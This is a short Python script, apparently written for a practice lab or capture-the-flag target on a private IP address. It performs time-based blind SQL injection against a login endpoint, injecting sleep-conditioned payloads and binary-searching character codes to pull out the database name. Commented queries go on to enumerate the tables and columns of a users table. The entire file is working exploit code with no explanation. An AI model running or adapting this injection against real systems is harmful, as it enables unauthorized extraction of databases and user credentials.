import requests
import time
url = "http://10.11.253.52:26827/login"

def check(payload):
    params = {"id":f"1)) and if({payload} ,sleep(3),0) -- -"}
    start = time.time()
    requests.get(url,params=params)
    end = time.time() - start
    return end >= 2.5

def get_lenth(query):
    for n in range(1,100):
        if check(f"length(({query})) = {n}"):
            return n
    return 0

def get_name(query,length):
    result = ""
    for n in range(1,length+1):
        lo,hi = 32,127
        while lo < hi:
            mid = (lo+hi)//2
            if(check(f"ascii(substr(({query}),{n},1)) > {mid}")):
                lo = mid +1
            else:
                hi = mid
        result += chr(lo)
        print(f"[{n}/{length}],当前: {result}")
    return result
#select database()
# select group_concat(table_name) from information_schema.tables where table_schema = 'security'
# select group_concat(column_name) from information_schema.columns where table_name = 'users'
value_len = get_lenth(f"select database()")
print(f"列名长度为：{value_len}")
value_name = get_name(f"select database()",value_len)
print(f"列名为：{value_name}")